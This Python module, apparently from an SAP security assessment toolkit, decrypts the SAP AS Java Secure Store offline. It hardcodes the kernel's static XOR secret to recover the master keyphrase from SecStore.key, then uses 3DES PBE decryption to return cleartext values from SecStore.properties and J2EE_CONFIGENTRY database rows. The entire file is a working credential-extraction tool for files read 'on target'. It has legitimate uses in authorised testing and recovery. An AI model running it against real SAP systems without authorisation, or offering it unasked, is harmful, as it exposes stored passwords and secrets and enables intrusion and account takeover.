#!/usr/bin/env python3
"""Offline decryption of SAP AS Java Secure Store.

Ported from ERPScan's 2018 SecStoreDec.py (MIT license) — algorithm
details in ``docs/research/07_java_secstore_recovery.md``.

Inputs required on target (readable as ``<sid>adm``):

    /usr/sap/<SID>/SYS/global/security/data/SecStore.key
    /usr/sap/<SID>/SYS/global/security/data/SecStore.properties   (optional)

Plus the raw VBYTES (hex-encoded) of any J2EE_CONFIGENTRY rows whose
SecStoreFS.decrypt() failed via SAPMAP's JSP-side path — ERPScan
confirmed the J2EE_CONFIGENTRY VBYTES use the *same* keyphrase as the
filesystem store, so the rows our engine-side decrypt refused can be
handled here offline.

This module is deliberately free of SAP engine / SDK / JDBC dependencies
— everything runs with nothing but ``hashlib`` + ``pycryptodome``.

Public API
----------

    deobfuscate_seckey(seckey_bytes) -> (keyphrase: bytes, is_v7plus: bool)
    decrypt_vbytes(vbytes_hex, keyphrase, sid=None) -> bytes | None
    decrypt_secstore_properties(props_text, keyphrase, sid=None) -> dict

The SID argument matters only for pre-7.00.000 kernels (we still support
them because occasional 7.02 double-stacks turn up) — the keyphrase has
the SID appended for those.  Modern (7.1+) systems pass sid=None.
"""

from __future__ import annotations

import base64
import hashlib
import logging
import re
from typing import Dict, Optional, Tuple

try:
    from Crypto.Cipher import DES3
except ImportError as e:  # pragma: no cover - pycryptodome is a hard dep
    raise ImportError(
        "pycryptodome required: pip install pycryptodome"
    ) from e

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants — all from ERPScan's public research
# ---------------------------------------------------------------------------

# Static 20-byte XOR secret hardcoded in the SAP kernel since at least 7.00.
# Source: github.com/erpscanteam/SecStoreDec/blob/master/SecStoreDec.py
_SECRET_XOR = bytes([
    0x2b, 0xb6, 0x8f, 0xfa, 0x96, 0xec, 0xb6, 0x10,
    0x24, 0x47, 0x92, 0x65, 0x17, 0xb0, 0x09, 0xc4,
    0x3e, 0x0a, 0xd7, 0xbd,
])

# Regex that matches a SecStore.key line: "<major>.<minor>.<patch>.<build>|<key>"
_SECKEY_RE = re.compile(rb"(\d\.\d{2}\.\d{3})\.\d{3}\|(.*)", re.DOTALL)

# Fixed PBE params — PBEWithSHAAnd3KeyTripleDESCBC with these specifics is
# what the SAP configtool Java code uses.
_PBE_SALT = b"\x00" * 16
_PBE_ITERATIONS = 0        # 0 is treated as 1 effective round by the KDF

# Each decrypted plaintext starts with an 18-byte "alphabet" header that
# SAP prefixes for algorithm / version bookkeeping.  We skip it.
_ALPHABET_SKIP = 18

# VBYTES format byte constants
_VBFMT_CLEARTEXT = 0x00
_VBFMT_PBE       = 0x01


# ---------------------------------------------------------------------------
# PKCS#12 v1.0 KDF (RFC 7292 Appendix B.2) — pure Python
# ---------------------------------------------------------------------------
#
# Used to derive a 24-byte 3DES key (purpose_id=1) and 8-byte IV
# (purpose_id=2) from a password + salt.  Referenced against the RFC 7292
# test vectors in tests/test_java_secstore_offline.py.

def _pkcs12_kdf(password_bmp: bytes, salt: bytes, iterations: int,
                 purpose_id: int, out_len: int,
                 hash_fn=hashlib.sha1,
                 v: int = 64, u: int = 20) -> bytes:
    """PKCS#12 v1.0 KDF.

    password_bmp: password encoded as BMPString (UTF-16BE, null-terminated).
    salt:        raw salt bytes.
    iterations:  PBE iteration count.  0 is normalized to 1 (matches the
                 behaviour of pyjks which ERPScan's code builds on).
    purpose_id:  1 = encryption key, 2 = IV, 3 = MAC key.
    out_len:     number of output bytes required.
    v, u:        hash block / output size in bytes.  Defaults correspond
                 to SHA-1 (which is what SAP's 3DES scheme needs).
    """
    if iterations < 1:
        iterations = 1

    # D = v bytes of purpose_id
    D = bytes([purpose_id]) * v

    # S = salt extended to v * ceil(len(salt)/v) bytes by repetition
    if salt:
        s_out = v * ((len(salt) + v - 1) // v)
        reps = (s_out + len(salt) - 1) // len(salt)
        S = (salt * reps)[:s_out]
    else:
        S = b""

    # P = password extended similarly
    if password_bmp:
        p_out = v * ((len(password_bmp) + v - 1) // v)
        reps = (p_out + len(password_bmp) - 1) // len(password_bmp)
        P = (password_bmp * reps)[:p_out]
    else:
        P = b""

    I = S + P
    result = b""
    mod = 1 << (8 * v)

    while len(result) < out_len:
        # A = H^iterations(D || I)
        A = D + I
        for _ in range(iterations):
            A = hash_fn(A).digest()
        result += A

        if len(result) >= out_len:
            break

        # B = A repeated to v bytes
        B = (A * ((v + u - 1) // u))[:v]
        b_int = int.from_bytes(B, "big")

        # I_j = (I_j + B + 1) mod 2^(8v), per v-byte chunk
        new_I = bytearray()
        for j in range(0, len(I), v):
            chunk = int.from_bytes(I[j:j + v], "big")
            new_chunk = (chunk + b_int + 1) % mod
            new_I += new_chunk.to_bytes(v, "big")
        I = bytes(new_I)

    return result[:out_len]


def _pwd_to_bmp(password: bytes | str) -> bytes:
    """BMPString encoding (UTF-16BE, null-terminated) required by PKCS#12."""
    if isinstance(password, bytes):
        password = password.decode("latin-1")
    return password.encode("utf-16-be") + b"\x00\x00"


def _pbe_decrypt_3des_cbc(ciphertext: bytes, password: bytes | str,
                            salt: bytes = _PBE_SALT,
                            iterations: int = _PBE_ITERATIONS) -> bytes:
    """PBEWithSHAAnd3KeyTripleDESCBC decrypt.

    Returns the plaintext with PKCS#7 padding stripped.  Raises
    ValueError if the ciphertext isn't a multiple of 8 bytes or if
    padding is invalid.
    """
    if len(ciphertext) == 0 or len(ciphertext) % 8 != 0:
        raise ValueError(f"ciphertext length {len(ciphertext)} not a "
                         f"multiple of 8")
    pw_bmp = _pwd_to_bmp(password)
    key = _pkcs12_kdf(pw_bmp, salt, iterations, 1, 24)
    iv = _pkcs12_kdf(pw_bmp, salt, iterations, 2, 8)
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    padded = cipher.decrypt(ciphertext)
    # Strip PKCS#7 padding
    if not padded:
        return padded
    pad_len = padded[-1]
    if 1 <= pad_len <= 8 and padded[-pad_len:] == bytes([pad_len]) * pad_len:
        return padded[:-pad_len]
    # Some SAP rows have no / corrupt padding — return as-is and let the
    # caller's header-strip logic handle the end.
    return padded


# ---------------------------------------------------------------------------
# SecStore.key — extract the master keyphrase
# ---------------------------------------------------------------------------

def deobfuscate_seckey(seckey_bytes: bytes) -> Tuple[bytes, bool]:
    """Extract and deobfuscate the master keyphrase from SecStore.key.

    Returns (keyphrase, is_v7plus).  For v7.00.000 exactly, the
    keyphrase is used alone; for anything OLDER the caller should
    append the SID to the keyphrase.  Everything newer (7.01+) uses
    keyphrase alone — ERPScan's "is_v7plus" flag is really "is 7.00.000
    or newer" which is always True in practice for us.

    Raises ValueError if the file doesn't match the expected format.
    """
    m = _SECKEY_RE.search(seckey_bytes)
    if not m:
        raise ValueError("SecStore.key has unexpected format "
                         "(no '<ver>|<key>' line matched)")
    fullver = m.group(1).decode("ascii")
    obf = m.group(2)
    # Strip any trailing newline / CRLF / whitespace that got into the
    # captured group via regex greediness.
    obf = obf.rstrip(b"\r\n\t ")
    # XOR against the 20-byte secret, cycling it
    clear = bytes(obf[i] ^ _SECRET_XOR[i % len(_SECRET_XOR)]
                   for i in range(len(obf)))
    is_v7plus = fullver >= "7.00.000"
    return clear, is_v7plus


# ---------------------------------------------------------------------------
# J2EE_CONFIGENTRY VBYTES
# ---------------------------------------------------------------------------

def decrypt_vbytes(vbytes_hex: str, keyphrase: bytes,
                    sid: Optional[str] = None) -> Optional[bytes]:
    """Decrypt a single J2EE_CONFIGENTRY.VBYTES value.

    vbytes_hex: hex-encoded VBYTES blob as pulled from the DB.  Whitespace
                is tolerated (MaxDB's raw-to-hex sometimes inserts it).
    keyphrase:  the deobfuscated keyphrase from SecStore.key (with SID
                appended if <7.00.000).
    sid:        passed through for legacy kernels (unused when keyphrase
                already includes the SID).  Accepted for API symmetry.

    Returns the decrypted + header-stripped plaintext as bytes, or None
    if the format byte is unrecognised (i.e., the row genuinely isn't
    SecStoreFS-encrypted — e.g. WS-RM sequence state, PSE blobs).
    """
    # Tolerate whitespace / trailing nulls the JDBC driver may include
    cleaned = re.sub(r"\s+", "", vbytes_hex)
    if not cleaned:
        return None
    try:
        data = bytes.fromhex(cleaned)
    except ValueError:
        return None
    if len(data) < 3:
        return None

    fmt = data[0]
    body = data[2:]    # skip format byte + (unused) flag/len byte

    if fmt == _VBFMT_CLEARTEXT:
        # Cleartext — stored base64-encoded with the 18-byte alphabet header.
        try:
            plain = base64.b64decode(body, validate=False)
        except Exception:
            return None
        return plain[_ALPHABET_SKIP:] if len(plain) > _ALPHABET_SKIP else b""

    if fmt == _VBFMT_PBE:
        # Encrypted — PBEWithSHAAnd3KeyTripleDESCBC.
        try:
            dec = _pbe_decrypt_3des_cbc(body, keyphrase)
        except Exception as e:
            logger.debug(f"PBE decrypt failed on VBYTES: {e}")
            return None
        return dec[_ALPHABET_SKIP:] if len(dec) > _ALPHABET_SKIP else b""

    # Unknown format byte — row isn't SecStoreFS data.
    return None


# ---------------------------------------------------------------------------
# SecStore.properties
# ---------------------------------------------------------------------------

def decrypt_secstore_properties(props_text: str, keyphrase: bytes,
                                 sid: Optional[str] = None) -> Dict[str, str]:
    """Parse + decrypt a SecStore.properties file body.

    props_text: full text of SecStore.properties (UTF-8 or ASCII).
    keyphrase:  same as for decrypt_vbytes.

    Returns a {prop_name: cleartext_value} dict.  Lines containing
    '$internal' or starting with '#' are skipped.  Values that fail to
    decrypt are silently dropped — caller can diff against the raw prop
    list if completeness matters.
    """
    out: Dict[str, str] = {}
    for line in props_text.splitlines():
        line = line.strip()
        if not line or "$internal" in line or line.startswith("#"):
            continue
        if "=" not in line:
            continue
        prop, b64val = line.split("=", 1)
        prop = prop.strip()
        b64val = b64val.strip().replace("\\r\\n", "").replace("\\n", "")
        if not b64val:
            continue
        try:
            ct = base64.b64decode(b64val, validate=False)
        except Exception:
            continue
        try:
            dec = _pbe_decrypt_3des_cbc(ct, keyphrase)
        except Exception as e:
            logger.debug(f"SecStore.properties decrypt failed on "
                          f"{prop}: {e}")
            continue
        # Plaintext layout: "<prefix>|<length>|<value_bytes>..."
        parts = dec.split(b"|", 2)
        if len(parts) == 3:
            try:
                declared_len = int(parts[1])
            except ValueError:
                declared_len = 0
            value_bytes = parts[2][:declared_len] if declared_len > 0 else parts[2]
        else:
            # Legacy / malformed — take the whole decrypted string.
            value_bytes = dec
        try:
            out[prop] = value_bytes.decode("utf-8", errors="replace")
        except Exception:
            out[prop] = value_bytes.hex()
    return out


__all__ = [
    "deobfuscate_seckey",
    "decrypt_vbytes",
    "decrypt_secstore_properties",
]
